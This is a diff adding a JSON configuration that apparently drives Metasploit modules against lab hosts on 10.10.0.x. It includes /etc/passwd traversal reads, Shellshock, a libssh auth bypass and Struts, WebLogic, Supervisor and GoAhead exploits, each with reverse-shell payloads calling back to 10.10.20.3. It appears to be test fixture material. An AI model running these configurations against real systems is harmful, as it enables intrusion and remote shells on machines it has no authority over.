@@ -1,0 +1,95 @@
+{
+  "auxiliary": {
+    "scanner/http/coldfusion_locale_traversal": [
+      {
+        "RHOSTS": "10.10.0.3",
+        "RPORT": "8500",
+        "FILE": "/etc/passwd"
+      }
+    ],
+    "scanner/http/apache_mod_cgi_bash_env": [
+      {
+        "RHOSTS": "10.10.0.4",
+        "TARGETURI": "/victim.cgi"
+      }
+    ],
+    "scanner/ssh/ssh_enumusers": [
+      {
+        "RHOSTS": "10.10.0.11",
+        "USERNAME": "root"
+      }
+    ],
+    "scanner/ssh/libssh_auth_bypass": [
+      {
+        "RHOSTS": "10.10.0.10",
+        "CMD": "id",
+        "ACTION": "Execute"
+      }
+    ],
+    "gather/rails_doubletap_file_read": [
+      {
+        "RHOSTS": "10.10.0.12",
+        "RPORT": "3000",
+        "ROUTE": "/robots"
+      }
+    ]
+  },
+  "exploit": {
+    "multi/http/struts_dmi_exec": [
+      {
+        "RHOSTS": "10.10.0.5",
+        "PAYLOAD": {
+          "NAME": "java/meterpreter/reverse_tcp",
+          "OPTIONS": {
+            "LHOST": "10.10.20.3"
+          }
+        }
+      }
+    ],
+    "multi/http/struts2_content_type_ognl": [
+      {
+        "RHOSTS": "10.10.0.6",
+        "TARGETURI": "/",
+        "PAYLOAD": {
+          "NAME": "linux/x64/meterpreter/reverse_tcp",
+          "OPTIONS": {
+            "LHOST": "10.10.20.3"
+          }
+        }
+      }
+    ],
+    "multi/misc/weblogic_deserialize_asyncresponseservice": [
+      {
+        "RHOSTS": "10.10.0.7",
+        "PAYLOAD": {
+          "NAME": "cmd/unix/reverse_bash",
+          "OPTIONS": {
+            "LHOST": "10.10.20.3"
+          }
+        }
+      }
+    ],
+    "linux/http/supervisor_xmlrpc_exec": [
+      {
+        "RHOSTS": "10.10.0.8",
+        "PAYLOAD": {
+          "NAME": "linux/x64/meterpreter/reverse_tcp",
+          "OPTIONS": {
+            "LHOST": "10.10.20.3"
+          }
+        }
+      }
+    ],
+    "linux/http/goahead_ldpreload": [
+      {
+        "RHOSTS": "10.10.0.9",
+        "PAYLOAD": {
+          "NAME": "cmd/unix/reverse_stub",
+          "OPTIONS": {
+            "LHOST": "10.10.20.3"
+          }
+        }
+      }
+    ]
+  }
+}
